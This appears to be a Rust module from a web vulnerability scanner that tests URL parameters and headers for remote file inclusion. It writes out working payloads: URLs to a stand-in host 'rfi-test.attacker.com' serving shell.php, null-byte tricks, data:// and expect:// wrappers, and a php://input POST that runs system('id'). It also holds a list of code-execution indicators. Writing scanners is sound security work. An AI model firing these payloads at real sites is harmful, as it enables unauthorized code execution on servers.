//! RFI Detection Module
//!
//! Detects RFI by injecting controlled remote URLs and verifying inclusion markers.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// RFI test configuration
#[derive(Debug, Clone)]
pub struct RfiTestConfig {
    pub callback_domain: String,
    pub unique_marker: String,
    pub test_paths: Vec<String>,
}

/// RFI inclusion detection module
pub struct RfiInclusionModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    config: RfiTestConfig,
}

impl RfiInclusionModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        let unique_marker = format!("RFI_TEST_{}", uuid::Uuid::new_v4().simple());
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            config: RfiTestConfig {
                callback_domain: "rfi-test.attacker.com".to_string(),
                unique_marker,
                test_paths: vec![
                    "/rfi_test.txt".to_string(),
                    "/shell.php".to_string(),
                    "/test.txt".to_string(),
                    "/include.php".to_string(),
                ],
            },
        }
    }

    /// Generate RFI payloads
    fn generate_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(50);
        let marker = &self.config.unique_marker;
        let domain = &self.config.callback_domain;

        // Basic HTTP RFI
        for path in &self.config.test_paths {
            payloads.push(format!("http://{}{}", domain, path));
            payloads.push(format!("https://{}{}", domain, path));
        }

        // With query parameters
        payloads.push(format!("http://{}/rfi_test.txt?marker={}", domain, marker));
        payloads.push(format!("http://{}/shell.php?cmd=id", domain));
        payloads.push(format!("http://{}/test.txt?{}", domain, marker));

        // Protocol variations
        payloads.push(format!("ftp://{}/rfi_test.txt", domain));
        payloads.push(format!("ftps://{}/rfi_test.txt", domain));

        // PHP-specific RFI payloads
        payloads.push(format!("http://{}/shell.php.txt", domain));
        payloads.push(format!("http://{}/shell.php%00.txt", domain));
        payloads.push(format!("http://{}/shell.php%00", domain));
        payloads.push(format!("http://{}/shell.php?.jpg", domain));
        payloads.push(format!("http://{}/shell.php#.jpg", domain));

        // Subdomain variations
        payloads.push(format!("http://rfi.{}/test.txt", domain));
        payloads.push(format!("http://test.{}/rfi.txt", domain));
        payloads.push(format!("http://{}.{}/rfi.txt", marker, domain));

        // IP-based callbacks
        payloads.push("http://127.0.0.1:8080/rfi_test.txt".to_string());
        payloads.push("http://127.0.0.1:8080/shell.php".to_string());
        payloads.push("http://[::1]:8080/rfi_test.txt".to_string());

        // Data URI RFI
        let php_code = format!("<?php echo '{}'; ?>", marker);
        let encoded = base64::encode(&php_code);
        payloads.push(format!("data://text/plain;base64,{}", encoded));

        // PHP wrapper RFI
        payloads.push(format!("php://input"));
        payloads.push(format!("expect://echo '{}'", marker));

        payloads
    }

    /// Test RFI payload
    async fn test_rfi(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        payload: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(10000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body_str = String::from_utf8_lossy(&body);
        
        // Check for our unique marker in response
        if body_str.contains(&self.config.unique_marker) {
            let evidence = self.create_evidence(&test_url, &body, &headers, status, payload);
            let finding = Finding::new(
                "rfi_inclusion",
                FindingSeverity::Critical,
                "Remote File Inclusion",
                format!("RFI detected via parameter '{}' - remote code executed", param_name),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload.to_string())
            .with_evidence(evidence)
            .with_confidence(95)
            .with_tags(vec!["rfi", "remote-file-inclusion", "code-execution", "rce"])
            .with_cwe("CWE-98")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        // Check for PHP code execution indicators
        let php_indicators = [
            "uid=", "gid=", "groups=", "root:", "daemon:",
            "Linux", "Darwin", "FreeBSD", "Windows NT",
            "PHP Version", "PHP Extension", "Build Date",
            "Server API", "Configuration File",
        ];

        for indicator in &php_indicators {
            if body_str.contains(indicator) {
                let evidence = self.create_evidence(&test_url, &body, &headers, status, payload);
                let finding = Finding::new(
                    "rfi_inclusion",
                    FindingSeverity::Critical,
                    "Remote File Inclusion (PHP Execution)",
                    format!("RFI detected via parameter '{}' - PHP code executed", param_name),
                    &ctx.target_url,
                )
                .with_method("GET")
                .with_payload(payload.to_string())
                .with_evidence(evidence)
                .with_confidence(90)
                .with_tags(vec!["rfi", "remote-file-inclusion", "php-execution", "rce"])
                .with_cwe("CWE-98")
                .with_agent_id(ctx.agent_id);

                return Ok(Some(finding));
            }
        }

        // Check for file inclusion indicators (remote file content)
        let inclusion_indicators = [
            "RFI_TEST_",
            "rfi_test",
            "shell.php",
            "<?php",
            "<?=",
            "eval(",
            "assert(",
            "system(",
            "exec(",
            "shell_exec(",
            "passthru(",
        ];

        for indicator in &inclusion_indicators {
            if body_str.contains(indicator) {
                let evidence = self.create_evidence(&test_url, &body, &headers, status, payload);
                let finding = Finding::new(
                    "rfi_inclusion",
                    FindingSeverity::High,
                    "Remote File Inclusion (File Content)",
                    format!("RFI detected via parameter '{}' - remote file content included", param_name),
                    &ctx.target_url,
                )
                .with_method("GET")
                .with_payload(payload.to_string())
                .with_evidence(evidence)
                .with_confidence(80)
                .with_tags(vec!["rfi", "remote-file-inclusion", "file-inclusion"])
                .with_cwe("CWE-98")
                .with_agent_id(ctx.agent_id);

                return Ok(Some(finding));
            }
        }

        Ok(None)
    }

    /// Test RFI with POST data for php://input
    async fn test_rfi_post(
        &self,
        ctx: &CheckContext,
        param_name: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}=", ctx.target_url, param_name);
        
        // PHP code with unique marker
        let php_code = format!("<?php echo '{}'; system('id'); ?>", self.config.unique_marker);
        
        let response = self.http_client
            .post(&test_url)
            .body(php_code.clone())
            .header("Content-Type", "application/x-www-form-urlencoded")
            .timeout(Duration::from_millis(10000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body_str = String::from_utf8_lossy(&body);
        
        if body_str.contains(&self.config.unique_marker) || body_str.contains("uid=") {
            let evidence = self.create_post_evidence(&test_url, &body, &headers, status, &php_code);
            let finding = Finding::new(
                "rfi_php_input",
                FindingSeverity::Critical,
                "RFI via php://input (POST)",
                format!("RFI via php://input allows RCE through POST data in parameter '{}'", param_name),
                &ctx.target_url,
            )
            .with_method("POST")
            .with_payload(php_code)
            .with_evidence(evidence)
            .with_confidence(95)
            .with_tags(vec!["rfi", "php-input", "post", "rce", "code-execution"])
            .with_cwe("CWE-98")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Test RFI via header injection
    async fn test_rfi_headers(
        &self,
        ctx: &CheckContext,
    ) -> Result<Option<Finding>, ModuleError> {
        // Test X-Forwarded-For, X-Original-URL, etc. for RFI
        let header_payloads = [
            format!("http://{}/rfi_test.txt", self.config.callback_domain),
            format!("http://{}/shell.php", self.config.callback_domain),
        ];

        for payload in &header_payloads {
            let response = self.http_client
                .get(&ctx.target_url)
                .header("X-Forwarded-For", payload)
                .header("X-Original-URL", payload)
                .header("X-Rewrite-URL", payload)
                .header("X-Forwarded-Host", payload)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                let body_str = String::from_utf8_lossy(&body);
                
                if body_str.contains(&self.config.unique_marker) {
                    let evidence = self.create_header_evidence(&ctx.target_url, &body, &headers, status, payload);
                    let finding = Finding::new(
                        "rfi_header_injection",
                        FindingSeverity::Critical,
                        "RFI via Header Injection",
                        format!("RFI via header injection - remote file included through headers"),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload.clone())
                    .with_evidence(evidence)
                    .with_confidence(90)
                    .with_tags(vec!["rfi", "header-injection", "x-forwarded-for", "code-execution"])
                    .with_cwe("CWE-98")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Create evidence for RFI finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("RFI: payload='{}', status={}, bytes={}, marker_found={}", 
                payload, status, body.len(), body_preview.contains(&self.config.unique_marker)),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 90,
        }
    }

    /// Create evidence for POST RFI
    fn create_post_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        php_code: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("POST {} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n{}", test_url, php_code);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("RFI POST: php_code='{}', status={}, bytes={}", php_code, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 95,
        }
    }

    /// Create evidence for header injection RFI
    fn create_header_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1\nX-Forwarded-For: {}\nX-Original-URL: {}", test_url, payload, payload);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("RFI Header Injection: payload='{}', status={}, bytes={}", payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: Some("X-Forwarded-For".to_string()),
            },
            confidence: 90,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for RfiInclusionModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("RFI Inclusion module initialized with marker: {}", self.config.unique_marker);
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "rfi_inclusion",
                "Remote File Inclusion",
                "Detects RFI by injecting controlled remote URLs and verifying inclusion markers",
                Severity::Critical,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["rfi", "remote-file-inclusion", "code-execution", "rce", "php-input"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Remote_File_Inclusion",
                "https://cwe.mitre.org/data/definitions/98.html",
                "https://portswigger.net/web-security/file-path-traversal",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(150);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test RFI payloads
        let payloads = self.generate_payloads();
        for payload in payloads {
            for param in &params {
                if request_count >= max_requests / 2 {
                    break;
                }

                if let Some(finding) = self.test_rfi(&ctx, param, &payload).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test php://input with POST
        if request_count < max_requests * 3 / 4 {
            for param in &params {
                if request_count >= max_requests * 3 / 4 {
                    break;
                }

                if let Some(finding) = self.test_rfi_post(&ctx, param).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test header injection
        if request_count < max_requests {
            if let Some(finding) = self.test_rfi_headers(&ctx).await? {
                findings.push(finding);
            }
            request_count += 1;
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        35 // High priority - critical findings
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_lfi", "php_wrappers_lfi"]
    }
}

impl RfiInclusionModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_payloads() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = RfiInclusionModule::new(http_client, analysis_ctx, payload_registry);
        
        let payloads = module.generate_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("http://")));
        assert!(payloads.iter().any(|p| p.starts_with("https://")));
        assert!(payloads.iter().any(|p| p.starts_with("ftp://")));
        assert!(payloads.iter().any(|p| p.starts_with("data://")));
        assert!(payloads.iter().any(|p| p.contains("php://input")));
    }

    #[test]
    fn test_unique_marker() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = RfiInclusionModule::new(http_client, analysis_ctx, payload_registry);
        
        assert!(module.config.unique_marker.starts_with("RFI_TEST_"));
        assert!(module.config.unique_marker.len() > 20);
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = RfiInclusionModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?file=test&path=docs");
        assert_eq!(params, vec!["file", "path"]);
    }
}